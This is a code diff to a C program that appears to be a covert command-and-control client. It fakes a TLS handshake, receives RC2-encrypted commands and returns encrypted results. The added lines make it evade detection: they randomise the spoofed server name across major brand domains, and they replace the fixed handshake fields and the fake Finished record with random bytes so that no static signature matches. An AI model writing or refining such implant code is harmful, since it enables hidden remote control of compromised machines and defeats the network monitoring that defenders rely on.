@@ -6,6 +6,7 @@
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <unistd.h>
+#include <time.h>
 
 int end_tst() {
     volatile uint32_t i = 0x01234567;
@@ -14,7 +15,17 @@ int end_tst() {
 }
 
 void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
-    unsigned char serv_name[] = "www.yahoo.com";
+    unsigned char* pos_serv_names[14] = {
+        "www.baidu.com", "www.amazon.com",
+        "www.avast.com", "www.apple.com",
+        "www.bing.com", "www.dell.com",
+        "www.avira.com", "www.microsoft.com",
+        "www.linkedin.com", "www.paypal.com",
+        "www.uc.com", "www.yahoo.com",
+        "www.wikipedia.com", "www.wordpress.com"
+    };
+    srand(time(0));
+    unsigned char* serv_name = pos_serv_names[rand() % 14];
     unsigned char serv_name_s = strlen(serv_name);
     unsigned char serv_list_s = serv_name_s + 3;
     unsigned char ext_serv_s = serv_list_s + 2;
@@ -31,7 +42,8 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
     memcpy(ext_serv, ext_serv_pre, sizeof(ext_serv_pre));
     memcpy(ext_serv + sizeof(ext_serv_pre), serv_name, serv_name_s);
 
-    char ext_oth[] = {
+    unsigned char ext_oth[103+32] = {0};
+    unsigned char ext_oth_p1[] = {
         0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
         0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
         0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
@@ -46,6 +58,14 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
         0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38,
         0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0,
         0xd2, 0xcd, 0x16, 0x62, 0x54};
+    unsigned char* ext_oth_p2 = malloc(32);
+    srand(time(0));
+    for (int i = 0; i < 32; i++) {
+        ext_oth_p2[i] = rand();
+    }
+    memcpy(ext_oth, ext_oth_p1, 103);
+    memcpy(ext_oth+103, ext_oth_p2, 32);
+    free(ext_oth_p2);
 
     unsigned char ext_s = ext_serv_ss + sizeof(ext_oth);
     unsigned char* ext = malloc(ext_s);
@@ -53,16 +73,27 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
     memcpy(ext + ext_serv_ss, ext_oth, sizeof(ext_oth));
     free(ext_serv);
 
-    unsigned char cv_el[] = {
-        0x03, 0x03, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
-        0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b,
-        0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4,
-        0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee,
-        0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
-        0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x00, 0x08, 0x13,
+    unsigned char* cv_el_r1 = malloc(32);
+    unsigned char* cv_el_r2 = malloc(32);
+    srand(time(0));
+    for (int i = 0; i < 32; i++) {
+        cv_el_r1[i] = rand();
+        cv_el_r2[i] = rand();
+    }
+
+    unsigned char cv_el_p1[] = {0x03, 0x03};
+    unsigned char cv_el_p2[] = {0x20};
+    unsigned char cv_el_p3[] = {0x00, 0x08, 0x13,
         0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00,
         ext_s};
+    unsigned char cv_el[2+32+1+32+14] = {};
+    memcpy(cv_el, cv_el_p1, 2);
+    memcpy(cv_el+2, cv_el_r1, 32);
+    memcpy(cv_el+2+32, cv_el_p2, 1);
+    memcpy(cv_el+2+32+1, cv_el_r2, 32);
+    memcpy(cv_el+2+32+1+32, cv_el_p3, 14);
+    free(cv_el_r1);
+    free(cv_el_r2);
 
     unsigned char cv_rest_s = sizeof(cv_el) + ext_s;
     unsigned char* cv_rest = malloc(cv_rest_s);
@@ -142,19 +173,19 @@ void cnsm_serv_hel_plus(int sock) {
 }
 
 void snd_cli_hel_fin(int sock) {
-    unsigned char cli_hel_fin[] = {
+    int cli_hel_fin_s = 11+69;
+    unsigned char cli_hel_fin[cli_hel_fin_s];
+    unsigned char cli_hel_fin_p1[] = {
         0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03, 
-        0x03, 0x00, 0x45, 0x9f, 0xf9, 0xb0, 0x63, 0x17, 
-        0x51, 0x77, 0x32, 0x2a, 0x46, 0xdd, 0x98, 0x96, 
-        0xf3, 0xc3, 0xbb, 0x82, 0x0a, 0xb5, 0x17, 0x43, 
-        0xeb, 0xc2, 0x5f, 0xda, 0xdd, 0x53, 0x45, 0x4b, 
-        0x73, 0xde, 0xb5, 0x4c, 0xc7, 0x24, 0x8d, 0x41, 
-        0x1a, 0x18, 0xbc, 0xcf, 0x65, 0x7a, 0x96, 0x08, 
-        0x24, 0xe9, 0xa1, 0x93, 0x64, 0x83, 0x7c, 0x35, 
-        0x0a, 0x69, 0xa8, 0x8d, 0x4b, 0xf6, 0x35, 0xc8, 
-        0x5e, 0xb8, 0x74, 0xae, 0xbc, 0x9d, 0xfd, 0xe8
-    };
-    int cli_hel_fin_s = sizeof(cli_hel_fin);
+        0x03, 0x00, 0x45};
+    unsigned char* cli_hel_fin_p2 = malloc(69);
+    srand(time(0));
+    for (int i = 0; i < 69; i++) {
+        cli_hel_fin_p2[i] = rand();
+    }
+    memcpy(cli_hel_fin, cli_hel_fin_p1, 11);
+    memcpy(cli_hel_fin+11, cli_hel_fin_p2, 69);
+    free(cli_hel_fin_p2);
 
     send(sock, cli_hel_fin, cli_hel_fin_s, 0);
 }
@@ -252,7 +283,7 @@ int main(int argc, char const* argv[]) {
         memcpy(cmd_enc, buf_cmd+5, cmd_s);
         cmd_enc[cmd_s] = '\0';
 
-        unsigned char *cmd = malloc(cmd_s);
+        unsigned char *cmd = malloc(cmd_s+1);
         rc2(key, cmd_enc, cmd, cmd_s);
         cmd[cmd_s] = '\0';
 
@@ -298,10 +329,10 @@ int main(int argc, char const* argv[]) {
 
         send(sock, fin_res, 5 + buf_res_s, 0);
 
-        fin_res[5+buf_res_s] = 0;
-        unsigned char* fin_res2 = malloc(buf_res_s+1);
-        rc2(key, fin_res+5, fin_res2, buf_res_s);
-        fin_res2[buf_res_s] = 0;
+        free(cmd_enc);
+        free(cmd);
+        free(ciphertext);
+        free(fin_res);
     }
 
     close(client_fd);
